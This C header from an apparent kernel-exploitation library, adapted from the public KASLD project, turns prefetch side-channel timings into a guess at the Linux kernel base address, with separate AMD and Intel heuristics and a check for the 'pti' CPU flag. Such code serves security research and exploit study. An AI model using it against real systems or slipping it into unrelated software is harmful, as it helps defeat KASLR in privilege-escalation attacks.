// Adapted from bcoles/KASLD and the fixes proposed in libkpwn issue #1:
// https://github.com/bcoles/kasld/blob/147f5e88ff64fa253fa57a4e3c442b2e673ab3e9/src/include/prefetch_scan.h
// Copyright (c) 2019 Brendan Coles. See LICENSES/KASLD-MIT.txt.
#ifndef KPWN_PREFETCH_SCAN_H
#define KPWN_PREFETCH_SCAN_H

#include <ctype.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#define PREFETCH_TEXT_MIN 0xffffffff80000000ull
#define PREFETCH_TEXT_MAX 0xffffffffc0000000ull
#define PREFETCH_ALIGN 0x200000ull
#define PREFETCH_SLOTS                                                         \
  ((PREFETCH_TEXT_MAX - PREFETCH_TEXT_MIN) / PREFETCH_ALIGN)
#define PREFETCH_CONFIRM_K 5
#define PREFETCH_CONFIRM_M 8
#define PREFETCH_MIN_PLATEAU 12

static inline int prefetch_cmp_u64(const void *a, const void *b) {
  uint64_t va = *(const uint64_t *)a;
  uint64_t vb = *(const uint64_t *)b;
  return (va > vb) - (va < vb);
}

static inline uint64_t prefetch_median(const uint64_t *times) {
  uint64_t sorted[PREFETCH_SLOTS];
  memcpy(sorted, times, sizeof(sorted));
  qsort(sorted, PREFETCH_SLOTS, sizeof(uint64_t), prefetch_cmp_u64);
  return sorted[PREFETCH_SLOTS / 2];
}

static inline uint64_t prefetch_mad(const uint64_t *times, uint64_t center) {
  uint64_t dev[PREFETCH_SLOTS];
  for (size_t i = 0; i < PREFETCH_SLOTS; i++)
    dev[i] = times[i] > center ? times[i] - center : center - times[i];
  return prefetch_median(dev);
}

static inline uint64_t prefetch_noise_floor(const uint64_t *times,
                                            uint64_t median) {
  uint64_t mad = prefetch_mad(times, median);
  uint64_t floor = median >> 8;
  if (!floor)
    floor = 1;
  return mad > floor ? mad : floor;
}

static inline uint64_t prefetch_threshold(uint64_t base, uint64_t spread,
                                          unsigned scale) {
  if (spread > (UINT64_MAX - base) / scale)
    return UINT64_MAX;
  return base + spread * scale;
}

static inline long prefetch_amd_cluster(const uint64_t *times,
                                        uint64_t threshold, uint64_t edge_bound,
                                        size_t k, size_t m) {
  for (size_t idx = 0; idx + m <= PREFETCH_SLOTS; idx++) {
    if (times[idx] <= threshold)
      continue;
    size_t count = 0;
    for (size_t j = 0; j < m; j++)
      if (times[idx + j] > threshold)
        count++;
    if (count < k)
      continue;
    while (idx > 0 && times[idx - 1] > edge_bound)
      idx--;
    return (long)idx;
  }
  return -1;
}

static inline size_t prefetch_find_base_amd(const uint64_t *times,
                                            int batched) {
  uint64_t median = prefetch_median(times);
  if (!median)
    return 0;

  long edge;
  if (batched) {
    // Batched profiles need a stronger signal; do not walk into baseline noise.
    uint64_t threshold = prefetch_threshold(median, median, 2);
    edge = prefetch_amd_cluster(times, threshold, threshold, PREFETCH_CONFIRM_K,
                                PREFETCH_CONFIRM_M);
  } else {
    edge =
        prefetch_amd_cluster(times, prefetch_threshold(median, median / 2, 1),
                             prefetch_threshold(median, median / 4, 1),
                             PREFETCH_CONFIRM_K, PREFETCH_CONFIRM_M);
    if (edge < 0) {
      uint64_t mad = prefetch_noise_floor(times, median);
      // Narrow page-table boundary bands must not qualify at this lower cutoff.
      edge = prefetch_amd_cluster(times, prefetch_threshold(median, mad, 4),
                                  prefetch_threshold(median, mad, 2),
                                  (PREFETCH_MIN_PLATEAU * 3 + 3) / 4,
                                  PREFETCH_MIN_PLATEAU);
    }
  }
  // A leading signal above the noise floor but below the edge cutoff leaves
  // the base ambiguous. Let the batched retry resolve it instead of guessing.
  if (!batched && edge > 0 &&
      times[edge - 1] >
          prefetch_threshold(median, prefetch_noise_floor(times, median), 4))
    return 0;
  return edge < 0 ? 0 : PREFETCH_TEXT_MIN + (size_t)edge * PREFETCH_ALIGN;
}

static inline size_t prefetch_find_base_intel(const uint64_t *times) {
  uint64_t median = prefetch_median(times);
  if (!median)
    return 0;
  // Keep a nonzero separation even with coarse or very small timer readings.
  uint64_t gap = median / 20;
  uint64_t edge_gap = median / 40;
  uint64_t threshold = median - (gap ? gap : 1);
  uint64_t edge_bound = median - (edge_gap ? edge_gap : 1);

  for (size_t idx = 0; idx + PREFETCH_CONFIRM_M <= PREFETCH_SLOTS; idx++) {
    if (times[idx] > threshold)
      continue;
    size_t count = 0;
    for (size_t j = 0; j < PREFETCH_CONFIRM_M; j++)
      if (times[idx + j] <= threshold)
        count++;
    if (count < PREFETCH_CONFIRM_K)
      continue;
    // Recover weak leading slots, but only while they clear the noise bound.
    while (idx > 0 && times[idx - 1] < edge_bound)
      idx--;
    // Do not report the body as the base when a weaker leading slot remains
    // distinguishable from baseline noise, but fails the recovery cutoff.
    if (idx > 0 && times[idx - 1] < median &&
        median - times[idx - 1] >
            prefetch_threshold(0, prefetch_noise_floor(times, median), 4))
      return 0;
    return PREFETCH_TEXT_MIN + idx * PREFETCH_ALIGN;
  }
  // An isolated minimum or a flat profile is not evidence of a mapped image.
  return 0;
}

// Returns -1 when no flags line is available. Tokenization modifies cpuinfo.
static inline int prefetch_kpti_flag(char *cpuinfo) {
  if (!cpuinfo)
    return -1;
  int found_flags = 0;
  char *lines = NULL;
  for (char *line = strtok_r(cpuinfo, "\n", &lines); line;
       line = strtok_r(NULL, "\n", &lines)) {
    while (isspace((unsigned char)*line))
      line++;
    char *colon = strchr(line, ':');
    if (!colon)
      continue;
    char *end = colon;
    while (end > line && isspace((unsigned char)end[-1]))
      end--;
    if (end - line != 5 || strncmp(line, "flags", 5) != 0)
      continue;
    found_flags = 1;
    char *tokens = NULL;
    for (char *flag = strtok_r(colon + 1, " \t\r", &tokens); flag;
         flag = strtok_r(NULL, " \t\r", &tokens))
      if (strcmp(flag, "pti") == 0)
        return 1;
  }
  return found_flags ? 0 : -1;
}

#endif
